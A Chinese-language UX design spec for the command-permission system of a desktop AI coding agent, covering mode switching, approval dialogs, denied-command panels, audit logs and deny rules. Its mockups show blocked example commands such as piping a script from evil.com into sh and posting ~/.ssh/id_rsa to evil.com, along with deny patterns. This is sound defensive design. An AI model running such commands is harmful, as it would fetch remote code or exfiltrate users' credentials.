# LobsterAI 桌面端 UX 增强方案（命令权限 v2 配套）

> 立项日期：2026-05-04
> 关联文档：[command-permission-policy.md](./command-permission-policy.md)（策略层）
> 范围：Cowork 桌面 UI、设置页、托盘、通知、首启引导
> 目标：让 v2 权限策略在桌面端可感、可控、可回溯

---

## 1. 总体设计原则

| 原则 | 说明 |
|---|---|
| **当前模式始终可见** | 任何 Cowork 视图、托盘、状态栏都看得到当前 `permissionMode`，不让用户"误以为安全" |
| **决策可解释** | 每次拦截都给出"哪条维度命中、命中证据、为何危险"，三句以内说清 |
| **最小宽泛规则** | "总是允许"必须引导到精确规则；不允许一键 `Bash(*)` |
| **键盘优先** | 高频操作有快捷键；切档/审批/查看 denied 都不必鼠标到位 |
| **首次教育** | 模式系统首次启用走一次性 walk-through，之后只在升档时弹 |
| **可逆** | 任何危险动作（启用 bypass、清空规则、关闭审计）都可一键 undo |

---

## 2. Cowork 会话头部：模式切换器

### 2.1 视觉

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  ◀ feat/auth-revamp · session-x9k7                              ⋮            │
│  ┌─[ 🔒 read ]─[ ⏵ acceptEdits ]─[ 📋 plan ]─[ ⚡ auto ]─┐  📁 ~/proj/foo  🛡 12 │
└─────────────────────────────────────────────────────────────────────────────┘
```

- 当前模式高亮（亮色背景 + 加粗）；
- 不可用模式置灰（如 `auto` 在未登录、无 LLM 配额时不可点）；
- `bypass` **不在 UI 出现**，只能由 CLI 启动 flag 进入，会话头显示 `⚠ BYPASS` 红色横幅；
- 右侧固定信息：
  - 📁 工作目录（点击：在 Finder/Explorer 中打开）；
  - 🛡 受保护路径计数（hover 弹出列表）。

### 2.2 交互

| 触发 | 行为 |
|---|---|
| 点击模式 pill | 直接切换；若是升档（read→acceptEdits→auto），弹一次性确认（仅首次） |
| `Shift+Tab` | 在 read → acceptEdits → plan 之间循环（auto 需先在设置启用，启用后会被加入 cycle 末尾） |
| `⌘.` (macOS) / `Ctrl+.` | 一键回到 `read`（紧急刹车） |
| `⌘⇧A` | 切换到 `auto`（如已启用） |
| 切换到 `plan` | 自动追加一行系统消息："已进入计划模式，agent 不会改文件" |

### 2.3 升档确认（一次性）

```
┌──────────────────────────────────────────────────────┐
│  ⚡ 启用 Auto 模式                                      │
│                                                      │
│  Auto 模式会让 agent 在静态 + LLM 双分类器把关下自动     │
│  执行命令，减少打断，但不能完全消除风险。建议在以下场景    │
│  使用：                                                │
│  ✓ 受信任的工作区（git 仓库、开发容器）                  │
│  ✓ 长任务（重构、批量替换、部署预演）                    │
│                                                      │
│  以下行为**仍会**被拦截：                                │
│  • 数据外泄（curl 到非白名单域名）                       │
│  • 强 push 到 main、生产部署                            │
│  • 改写 shell rc / 系统启动项                           │
│                                                      │
│  连续 3 次或累计 20 次拦截后自动降档为 acceptEdits。     │
│                                                      │
│  [ 不再提示并启用 ]   [ 取消 ]                           │
└──────────────────────────────────────────────────────┘
```

---

## 3. Pre-flight 状态条（输入框上方）

替代/扩展现有 `CoworkPromptInput.tsx` 顶端区。

```
┌───────────────────────────────────────────────────────────────────┐
│  🔒 read  ·  📁 ~/projects/foo  ·  🛡 14 受保护  ·  🚫 1 边界 ▾    │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ 输入指令...                                                    │ │
│  └──────────────────────────────────────────────────────────────┘ │
│  [📎] [🎤]  规则: 12 allow · 3 ask · 8 deny           [ ⏎ Send ]  │
└───────────────────────────────────────────────────────────────────┘
```

- **🚫 边界**：当前对话内被识别出的 boundary（"别 push"、"等我 review"）。点击展开列表，可单条解除。
- **规则计数**：点击进入设置页规则编辑器（§7）。
- **快捷诊断**：在输入框中输入以 `?` 开头的命令（如 `?rm -rf node_modules`），不发给 agent，本地静态分类器即时显示 verdict 与命中维度——给重度用户的"试一下会不会被拦"小工具。

---

## 4. 命令批准弹窗 v2

替换现有 `CoworkPermissionModal.tsx`。

### 4.1 单命令场景

```
┌─────────────────────────────────────────────────────────────────────┐
│  🟠 命令需要批准                                  acceptEdits 模式  │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐ │
│  │ $ rm -rf node_modules && npm ci                               │ │
│  │   ─┬                          ─┬                              │ │
│  │    └ rm 递归删除               └ 安装 lock 中的依赖             │ │
│  └───────────────────────────────────────────────────────────────┘ │
│                                                                     │
│  📁 工作目录：~/projects/foo  ✓ 在范围内                            │
│  🎯 维度：file_destructive (recursive)                              │
│  💡 风险：递归删除，不可逆。但目标位于工作区内的 node_modules，         │
│      可由 `npm ci` 重新生成，风险等级中等。                           │
│  📜 来源：static (1.2ms)                                            │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ [ 允许此次 ]   [ 总是允许此精确命令 ]   [ 拒绝并请重试 ]      │   │
│  │                ↑ 写入规则: Bash(rm -rf node_modules)         │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ▸ 高级选项                                                          │
│    [ ] 加入会话边界（"本会话别再 rm node_modules"）                    │
│    [ ] 修改命令后允许...                                              │
└─────────────────────────────────────────────────────────────────────┘
```

**关键改动 vs v1**：
- 不再二选一（allow / deny）；增加 **"总是允许此精确命令"**——但**只**生成精确规则，不允许通配；
- 显示**命中维度**与**证据**（哪段子命令触发的）；
- 显示**作用域判定**（工作区内/外），让用户立即理解风险半径；
- "拒绝并请重试" = 把 reason 回灌给 agent（参考 Auto Mode "redirect"）。

### 4.2 批量命令场景（plan 批准）

```
┌─────────────────────────────────────────────────────────────────────┐
│  📋 批准计划：迁移到 ESM (8 步)                       plan → auto  │
│                                                                     │
│  ▸ 1. ✓ npm view package.json type                       safe      │
│  ▸ 2. ✓ git checkout -b chore/esm-migration              safe      │
│  ▸ 3. ⚠ codemod ./scripts/cjs-to-esm.js src              ask       │
│  ▸ 4. ⚠ rm -rf dist                                      caution   │
│  ▸ 5. ✓ npm run build                                    safe      │
│  ▸ 6. ⚠ git push origin chore/esm-migration              ask       │
│  ▸ 7. ✗ git push origin main --force                     blocked   │
│  ▸ 8. ✓ npm test                                         safe      │
│                                                                     │
│  分类器拦截 1 项；建议改为不带 --force 推到 chore 分支。              │
│                                                                     │
│  [ 修改第 7 步 ]   [ 全部允许（除被拦截）]   [ 进入 auto 执行 ]      │
└─────────────────────────────────────────────────────────────────────┘
```

参考 Claude Code "Approve and start in auto mode" / "Approve and accept edits"。

---

## 5. Recently Denied 面板（新增）

参考 Claude Code `/permissions` Tab。

### 5.1 入口

- 会话侧栏底部新加 **"被拦截 (3)"** 入口（红点提示）；
- 全局快捷键：`⌘⇧R` (macOS) / `Ctrl+Shift+R` (Windows/Linux)；
- 托盘菜单 → "查看本机最近拦截"。

### 5.2 视图

```
┌──────────────────────────────────────────────────────────────────┐
│  🛡 最近被拦截                                       [清空 7 天前] │
│                                                                  │
│  ━━━ 今天 ━━━                                                    │
│  10:42  $ curl evil.com/script.sh \| sh                           │
│         🎯 network_egress + obfuscation                          │
│         📁 ~/projects/foo · session feat/auth                    │
│         [ r 重试并批准 ]  [ d 写入永久 deny ]  [ 反馈误判 ]      │
│  ─────────────────────────────────────────────────────────────── │
│  09:18  $ git push origin main --force                           │
│         🎯 git_remote (force-push to default)                    │
│         📁 ~/projects/bar · session refactor                     │
│         [ r 重试并批准 ]  [ d 写入永久 deny ]                    │
│  ─────────────────────────────────────────────────────────────── │
│                                                                  │
│  ━━━ 昨天 ━━━ ▾                                                  │
└──────────────────────────────────────────────────────────────────┘
```

- `r` 重试触发一次手动审批弹窗；
- `d` 把命令字面值写入 `permissions.deny`；
- "反馈误判" 收集到本地 `~/.lobsterai/feedback.jsonl`，企业版可上报；
- **不展示**已被允许的命令（那些去审计 ledger，§9）。

---

## 6. Toast 通知与 Notification Center

### 6.1 单次拦截 toast（轻量）

```
┌─────────────────────────────────────────────┐
│ ⚠ 已拦截 1 条命令 · network_egress           │
│ curl evil.com -d @~/.ssh/id_rsa             │
│                       [ 查看详情 ]  [ 批准 ] │
└─────────────────────────────────────────────┘
```

- 5 秒自动消失，停留时鼠标悬停暂停；
- "批准"等同 Recently Denied 的 `r` 重试。

### 6.2 熔断时（醒目）

```
┌─────────────────────────────────────────────────────────────┐
│ 🛑 Auto 模式已暂停                                           │
│                                                             │
│ 连续 3 次拦截：agent 试图执行的命令均被分类器判定为高风险。     │
│ 当前会话已自动降档到 acceptEdits。                             │
│                                                             │
│ [ 查看 3 次拦截 ]  [ 保持当前模式 ]  [ 强制返回 auto ]      │
└─────────────────────────────────────────────────────────────┘
```

"强制返回 auto"再点一次还要二次确认，避免无意识点击。

### 6.3 系统通知（Notification Center）

仅以下事件下发系统通知（避免噪音）：
- 熔断触发；
- 进入 `bypass` 会话；
- IM 通道收到一条试图触发被拦截命令的消息（**这是被攻击信号**）；
- 安全审计 ledger 写入失败（持久化异常）。

---

## 7. 设置页：权限规则编辑器（新增 Tab）

`Settings.tsx` 新加 **"权限"** Tab。

### 7.1 总览

```
┌─────────────────────────────────────────────────────────────┐
│  权限                                                        │
│  ─────────────────────────────────────────────────────────  │
│                                                             │
│  默认模式（新会话）                                           │
│   ◉ read       ○ acceptEdits   ○ plan                       │
│                                                             │
│  Auto 模式                                                   │
│   ☑ 启用                                                     │
│   分类器模型：[ Claude Haiku 4.6   ▾ ]                      │
│   配额耗尽时：◉ 回退询问  ○ 阻断                             │
│                                                             │
│  IM 通道默认模式（覆盖以上）                                  │
│   ◉ read（推荐）    ○ acceptEdits                            │
│   ☑ secrets / network 维度永远拦截（不可改）                  │
│                                                             │
│  危险模式                                                    │
│   ☐ 允许 bypass 模式（仅在隔离容器中使用）                    │
│   ⚠ 启用后，agent 几乎不再被拦截                              │
│                                                             │
│  键盘快捷键                                                   │
│   切换模式: Shift+Tab    紧急回到 read: ⌘.                   │
│   最近拦截: ⌘⇧R           启用 auto: ⌘⇧A                    │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 规则编辑器

```
┌─────────────────────────────────────────────────────────────────┐
│  规则                                       [ 导入 ] [ 导出 ]     │
│  ───────────────────────────────────────────────────────────── │
│                                                                 │
│  Allow (12)                                            ▾        │
│  ────────────────────                                           │
│  ✓ Read(**)                                            [ ✕ ]    │
│  ✓ Bash(npm test)                                      [ ✕ ]    │
│  ✓ Bash(npm run build)                                 [ ✕ ]    │
│  ✓ Bash(git status)                                    [ ✕ ]    │
│  ✓ Bash(git diff:*)                                    [ ✕ ]    │
│  + 添加...                                                      │
│                                                                 │
│  Ask (3)                                               ▾        │
│  ────────────────────                                           │
│  ? Bash(git push:*)                                    [ ✕ ]    │
│  ? Bash(npm publish:*)                                 [ ✕ ]    │
│  + 添加...                                                      │
│                                                                 │
│  Deny (8)                                              ▾        │
│  ────────────────────                                           │
│  ✗ Bash(curl * \| sh)                                  [ ✕ ]    │
│  ✗ Read(~/.ssh/**)                                     [ ✕ ]    │
│  + 添加...                                                      │
│                                                                 │
│  ⚠ 编辑器会校验规则语法；宽泛规则（Bash(*)）在 auto 模式下自动失效。 │
└─────────────────────────────────────────────────────────────────┘
```

**关键交互**：
- 添加规则时**禁止保存** `Bash(*)` / `Tool(*)`，必须含至少一个具体 token；
- 自动补全：输入 `Bash(npm ` 弹出最近 30 天用过的 npm 子命令；
- "导出/导入" 用于团队共享（带版本号 + checksum，防 SEC-022 篡改场景）；
- 企业版：管理端规则前显示 🔒 图标，用户不可删除/编辑。

### 7.3 受保护路径

```
┌────────────────────────────────────────────────────────────┐
│  受保护路径（任何模式下不自动写入）                            │
│  ─────────────────────────────────────                      │
│  系统默认（不可改）                                           │
│   .git/, .vscode/, .idea/, .husky/                           │
│   ~/.bashrc, ~/.zshrc, ~/.profile, ~/.zprofile              │
│   ~/.aws/, ~/.ssh/, ~/.gnupg/, ~/.config/gh/                │
│   ~/Library/LaunchAgents/, ~/.config/autostart/             │
│   .mcp.json, .lobsterai/                                    │
│                                                             │
│  用户自定义                                                  │
│   ~/Documents/Tax/                                [ ✕ ]     │
│   ~/Backup/                                       [ ✕ ]     │
│   + 添加目录...                                              │
└────────────────────────────────────────────────────────────┘
```

### 7.4 信任设施（auto 模式）

```
┌────────────────────────────────────────────────────────────┐
│  Auto 模式信任设施                                           │
│  ─────────────────────────────────────                      │
│  受信任的 git remote                                         │
│   origin    (https://github.com/user/repo)        [ ✕ ]     │
│   upstream  (https://github.com/org/repo)         [ ✕ ]     │
│                                                             │
│  受信任的 HTTP/HTTPS 主机                                    │
│   api.openai.com           api.anthropic.com                │
│   registry.npmjs.org       hub.docker.com                   │
│                                                             │
│  默认起始分支（不会拦截 push）                                │
│   ◉ 自动检测 (当前: main)   ○ 指定 [ feat/*  ]              │
│                                                             │
│  ⚠ push 到非起始分支或非受信任 remote 会进入分类器审查        │
└────────────────────────────────────────────────────────────┘
```

---

## 8. 首次启用引导（Walk-through）

升级到 v2 后首启 / 首次切到非 read 模式时弹一次。

### 8.1 第 1 屏

```
┌──────────────────────────────────────────────────────────────┐
│  欢迎使用新的权限系统                                  1/3     │
│                                                              │
│  之前的 LobsterAI 默认放行大多数命令。新版本采用 5 档模式 +    │
│  分类器，让 agent 在不同信任级别下工作：                        │
│                                                              │
│  🔒 read         探索、不写不执行                              │
│  ⏵ acceptEdits  改本仓库代码、运行测试                         │
│  📋 plan         先出方案再执行                                │
│  ⚡ auto         分类器把关，长任务放手跑                       │
│                                                              │
│  你现在的会话已切到 acceptEdits（最常用）。                     │
│                                                              │
│                                       [ 下一步 → ]            │
└──────────────────────────────────────────────────────────────┘
```

### 8.2 第 2 屏：受保护路径

视觉化展示哪些目录"agent 一定不会动"，让用户安心。

### 8.3 第 3 屏：键盘速查

把 `Shift+Tab`、`⌘.`、`⌘⇧R` 提示一次，鼓励手不离键盘。

---

## 9. 审计 ledger 查看器（新增）

设置页 **"日志与审计"** Tab：

```
┌─────────────────────────────────────────────────────────────────┐
│  权限审计                                                        │
│  ───────────────────────────────────────────                    │
│  时间范围 [ 最近 7 天 ▾ ]   会话 [ 全部 ▾ ]   维度 [ 全部 ▾ ]   │
│  搜索 [ rm node_modules           ] 🔍                          │
│                                                                 │
│  时间          模式      命令                          决议    │
│  ────────────────────────────────────────────────────────────  │
│  10:42:13      read     curl evil.com/script.sh \| sh   ✗ block │
│  10:39:01      auto     git push origin feat/x          ✓ allow │
│  10:38:22      auto     npm ci                          ✓ allow │
│  10:35:11      auto     rm -rf node_modules             ✓ allow │
│  ...                                                            │
│                                                                 │
│  [ 导出 JSONL ]   [ 校验链 ]   保留: 90 天                       │
└─────────────────────────────────────────────────────────────────┘
```

- "校验链" 按钮立即跑一遍 HMAC 链验证，弹出"完整 ✓"或"已篡改条目 ✗ at line N"；
- 导出仅企业版默认开启，消费端默认本地查看（避免误导出 PII）；
- 一行点击展开：完整 JSON + 触发的维度证据 + 当时的对话边界快照。

---

## 10. 托盘 / 菜单栏

托盘菜单顶部新增"安全"区块：

```
LobsterAI                         ▾
─────────────────────────────────
🔵 5 个会话运行中
   • feat/auth-revamp ⚡ auto
   • bug/123 🔒 read
   • IM:wechat-bot 🔒 read
   • ...

🛡 安全
   今日 3 次拦截     (查看 ⌘⇧R)
   全部锁定到 read 模式
   暂停 auto 模式 (5 分钟)
─────────────────────────────────
设置...
退出
```

- "全部锁定到 read 模式"：一键把所有运行中会话切到 `read`（紧急刹车，发现机器异常时用）；
- "暂停 auto 5 分钟"：临时禁止任何会话自动执行命令，过 5 分钟自动恢复；
- IM 会话默认在托盘显示锁图标，强调"你不在场，agent 也不会乱跑"。

---

## 11. 子任务可视化（auto 模式三检）

在 `CoworkSessionDetail.tsx` 渲染子 agent 时插入：

```
┌────────────────────────────────────────────────────────┐
│  🤖 子 agent: code-reviewer                            │
│  ──────────────────────────────                        │
│  ① spawn check        ✓ task 描述安全                  │
│  ② runtime checks     ✓ 12 步全部通过                  │
│  ③ post check         ⚠ 发现 1 项可疑：尝试读 ~/.aws/ │
│                                                        │
│   [ 展开完整动作历史 ]                                  │
└────────────────────────────────────────────────────────┘
```

参考 Auto Mode "subagent 三检"。post check 命中时给父会话加红色 banner，提示用户复核。

---

## 12. 命令"沙盒预演"（acceptEdits/auto 增强）

借助现有 `DiffView.tsx`，在执行写入类命令**之前**先展示 diff。

```
┌───────────────────────────────────────────────────────────┐
│  📝 即将写入 src/auth.ts                                   │
│                                                           │
│  - export const login = (u, p) => api.post(...);          │
│  + export const login = async (u: string, p: string) => { │
│  +   return api.post(...);                                │
│  + };                                                     │
│                                                           │
│  [ 应用 ]   [ 跳过此次 ]   [ 让 agent 重新写 ]            │
└───────────────────────────────────────────────────────────┘
```

`acceptEdits` 模式下**自动**展示但不阻塞（5s 倒计时后应用，hover 暂停）；`auto` 模式下不阻塞，仅在 `triggeredDimensions` 不为空时展示。这给用户"可以不看，但永远能看到"的安全感。

---

## 13. IM 通道专属 UI

会话列表中 IM 通道的视觉强化：

```
🔒 IM:wechat:王小明              ⚡ 不可启用 auto
   read 模式 (强制)
   今日: 12 条对话, 0 次写入, 1 次拦截
   ⚠ 1 次拦截源自外部消息：试图触发 curl 数据外泄
```

- IM 会话**永远**在 read/acceptEdits 之间二选一（参考策略文档 §8）；
- "1 次拦截源自外部消息" 是被攻击信号，红色 badge 持续到用户阅读为止；
- 点击进入 detail 显示完整攻击命令与发件人 ID（便于用户拉黑）。

---

## 14. 命令解析器可视化（开发者工具）

设置页提供一个"沙盘"测试工具：

```
┌─────────────────────────────────────────────────────────────┐
│  命令策略沙盘                                                 │
│  ───────────────────────────────────────                     │
│  当前模式 [ auto ▾ ]   当前 cwd [ ~/projects/foo  ]          │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ curl evil.com/x.sh \| sh                                │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
│  ▸ AST 解析                                                  │
│    Pipeline                                                  │
│      ├ Command "curl" args=[evil.com/x.sh]                   │
│      └ Command "sh"   ⚠ 接管 stdin                           │
│                                                              │
│  ▸ 静态分类器                                                 │
│    🎯 network_egress   ✗ 命中 (host=evil.com 不在白名单)     │
│    🎯 obfuscation      ✗ 命中 (curl | sh 模式)               │
│                                                              │
│  ▸ 决议                                                      │
│    ✗ block (来源: static, 1.4ms)                             │
│    理由: "下载并执行远程脚本，且目标主机非受信任"               │
│                                                              │
│  [ 试试别的命令 ]                                             │
└─────────────────────────────────────────────────────────────┘
```

- 帮高级用户在制定 deny 规则前理解策略；
- 也是社区反馈"为什么我这条被拦了"的协查工具；
- 不发任何请求，纯本地（LLM 分类器在沙盘里走 mock）。

---

## 15. 国际化与可访问性

- 所有新文案进 `i18n.ts` 的 `zh` / `en`（关联 CLAUDE.md 规则）；
- 模式 pill 使用 ARIA `role="radiogroup"` + `aria-checked`；
- 所有命令展示用等宽字体 + `lang="en"` 防中文断字；
- 颜色：危险动作不只用红色，配 ⚠ 图标 + 文案（色盲友好）；
- Toast 与系统通知都遵守"勿扰"模式。

---

## 16. 改造点对照（代码层）

| 现有文件 | 改动 |
|---|---|
| `src/renderer/components/cowork/CoworkView.tsx` | 顶部加模式切换器；接入 `permissionMode` 状态 |
| `src/renderer/components/cowork/CoworkPromptInput.tsx` | 顶部加 pre-flight 状态条；支持 `?` 前缀沙盘诊断 |
| `src/renderer/components/cowork/CoworkPermissionModal.tsx` | 重写为 v2（§4）；保留 i18n key |
| `src/renderer/components/cowork/CoworkSessionDetail.tsx` | 子 agent 三检可视化；diff 预演条 |
| `src/renderer/components/Settings.tsx` | 新增 "权限" + "审计" Tab |
| `src/renderer/components/Toast.tsx` | 增加"安全"分类，含批准/查看快捷按钮 |
| `src/renderer/components/Sidebar.tsx` | 底部入口"被拦截 (n)"，红点 |
| 新增 `src/renderer/components/cowork/PermissionModeSwitcher.tsx` | §2 |
| 新增 `src/renderer/components/cowork/PermissionPreflightStrip.tsx` | §3 |
| 新增 `src/renderer/components/cowork/PermissionDeniedPanel.tsx` | §5 |
| 新增 `src/renderer/components/cowork/PermissionPlanReview.tsx` | §4.2 |
| 新增 `src/renderer/components/cowork/SubagentCheckpointStrip.tsx` | §11 |
| 新增 `src/renderer/components/settings/PermissionRulesEditor.tsx` | §7 |
| 新增 `src/renderer/components/settings/PermissionAuditLogView.tsx` | §9 |
| 新增 `src/renderer/components/settings/PermissionPlayground.tsx` | §14 |
| 新增 `src/renderer/components/welcome/PermissionWalkthrough.tsx` | §8 |
| `src/renderer/store/slices/coworkSlice.ts` | 增加 `permissionMode`、`recentlyDenied`、`boundaries` 字段 |
| 新增 `src/renderer/store/slices/permissionSlice.ts` | 规则、受保护路径、信任设施全局状态 |
| `src/main/trayManager.ts` | 顶部安全菜单、紧急刹车、auto 暂停 |
| `src/main/preload.ts` | 新增 `cowork.setPermissionMode`、`permissions.*` 命名空间 |
| `src/renderer/services/i18n.ts` | 全部新文案 zh/en |

---

## 17. 键盘快捷键总表

| 快捷键（macOS） | 快捷键（Win/Linux） | 行为 |
|---|---|---|
| `Shift+Tab` | `Shift+Tab` | 模式 cycle: read → acceptEdits → plan → (auto 启用时) |
| `⌘.` | `Ctrl+.` | 紧急回到 `read`（当前会话）|
| `⌘⌥.` | `Ctrl+Alt+.` | 紧急回到 `read`（**全部**运行中会话）|
| `⌘⇧A` | `Ctrl+Shift+A` | 切换到 `auto`（如已启用）|
| `⌘⇧R` | `Ctrl+Shift+R` | 打开 Recently Denied 面板 |
| `⌘⇧L` | `Ctrl+Shift+L` | 打开审计 ledger |
| `⌘P` | `Ctrl+P` | 进入 plan 模式（在 cowork 视图内）|
| `Y` | `Y` | 在批准弹窗中：允许此次 |
| `A` | `A` | 在批准弹窗中：总是允许此精确命令 |
| `N` | `N` | 在批准弹窗中：拒绝并请重试 |
| `R` | `R` | 在 Recently Denied：重试 |
| `D` | `D` | 在 Recently Denied：写入永久 deny |

---

## 18. 渐进交付（与策略层 M1-M8 对齐）

| 桌面端阶段 | 配套策略阶段 | 内容 |
|---|---|---|
| **D1** | M1（去掉硬编码）| Permission modal v2（§4.1）；会话头部加只读模式徽章 |
| **D2** | M2（受保护路径）| Pre-flight 状态条（§3）；受保护路径设置页 |
| **D3** | M3（AST 7 维度）| 沙盘工具（§14）；批准弹窗显示维度与证据 |
| **D4** | M4（模式切换）| 模式切换器（§2）；首启 walk-through（§8）；快捷键 |
| **D5** | M5（审计 + 熔断）| Recently Denied 面板（§5）；审计 ledger 查看器（§9）；Toast/通知 |
| **D6** | M6（auto + LLM）| auto 升档确认；Plan 批准（§4.2）；信任设施配置（§7.4）|
| **D7** | M7（边界 + 子任务）| Boundaries 列表（§3）；子 agent 三检（§11）|
| **D8** | M8（IM 强制 + 企业）| IM 通道 UI（§13）；托盘安全菜单（§10）；企业管理规则锁定 |

---

## 19. 不在本方案范围

- 命令执行环境隔离（容器/沙盒）：见策略文档 §15；
- 凭据加密：见 SEC-013；
- 网络出口白名单（实际拦截）：见 SEC-026；本文档只覆盖 UI 配置 §7.4。

---

## 20. 开放问题

1. **plan 模式批准后的"clear context"**：参考 Claude Code `showClearContextOnPlanAccept`，是否给用户选项？
2. **桌面通知合并**：连续多次拦截要不要合并成一条 toast？倾向 1 秒内合并。
3. **多会话紧急刹车的"undo"**：是否提供 30 秒撤销窗口？
4. **审计 ledger 体积**：90 天保留 + 满 100MB 切片，需要后台压缩任务。
5. **沙盘工具**：是否暴露给消费端？或仅高级模式打开？倾向后者，避免普通用户被吓到。

---

## 变更记录

| 日期 | 作者 | 说明 |
|---|---|---|
| 2026-05-04 | 安全审查 + UX 设计 | 初稿，对齐策略 v2 的桌面端体验 |
